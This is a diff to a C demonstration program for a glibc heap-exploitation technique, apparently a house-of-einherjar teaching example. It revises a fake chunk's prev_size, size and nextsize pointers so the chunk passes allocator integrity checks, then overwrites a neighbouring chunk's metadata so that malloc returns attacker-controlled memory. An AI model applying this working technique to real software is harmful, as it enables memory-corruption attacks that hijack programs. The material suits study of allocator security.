@@ -18,7 +18,6 @@ int main()
 
 	uint8_t* a;
 	uint8_t* b;
-	uint8_t* c;
 	uint8_t* d;
 
 	printf("\nWe allocate 0x38 bytes for 'a'\n");
@@ -36,16 +35,21 @@ int main()
 
     size_t fake_chunk[6];
 
-    fake_chunk[0] = 0x41414141; // prev_size not used
+    fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size
     fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin
     fake_chunk[2] = (size_t) fake_chunk; // fwd
     fake_chunk[3] = (size_t) fake_chunk; // bck
-
+    fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
+    fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize
+    
+    
     printf("Our fake chunk at %p looks like:\n", fake_chunk);
     printf("prev_size (not used): %#lx\n", fake_chunk[0]);
     printf("size: %#lx\n", fake_chunk[1]);
     printf("fwd: %#lx\n", fake_chunk[2]);
     printf("bck: %#lx\n", fake_chunk[3]);
+    printf("fwd_nextsize: %#lx\n", fake_chunk[4]);
+    printf("bck_nextsize: %#lx\n", fake_chunk[5]);
 
 	/* In this case it is easier if the chunk size attribute has a least significant byte with
 	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of 
@@ -55,10 +59,6 @@ int main()
 
 	printf("\nWe allocate 0xf8 bytes for 'b'.\n");
 	printf("b: %p\n", b);
-
-    printf("We allocate a 3rd chunk to make sure we don't touch the wilderness (not necessary)\n");
-    c = malloc(0x60);
-	printf("c: %p\n", c);
 
 	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
     /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/
@@ -80,15 +80,18 @@ int main()
     printf("Our fake prev_size will be %p - %p = %#lx\n", b-sizeof(size_t)*2, fake_chunk, fake_size);
     *(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;
 
+    //Change the fake chunk's previous address to reflect b's new size
+    printf("\nModify fake chunk's size to reflect b's new size\n");
+    fake_chunk[1] = fake_size;
+
     // free b and it will consolidate with our fake chunk
     printf("Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n");
     free(b);
     printf("Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);
-    printf("We edit our fake chunk size so that it is small enough to pass size checks\n");
-    printf("This wouldn't be necessary if our fake chunk was the top chunk (if we hadn't allocated c)\n");
+//    printf("We edit our fake chunk size so that it is small enough to pass size checks\n");
 
-    fake_chunk[1] = 0x1000;
-    printf("New fake_chunk size: %#lx\n", fake_chunk[1]);
+  //  fake_chunk[1] = 0x1000;
+    //printf("New fake_chunk size: %#lx\n", fake_chunk[1]);
 
     printf("\nNow we can call malloc() and it will begin in our fake chunk\n");
     d = malloc(0x200);
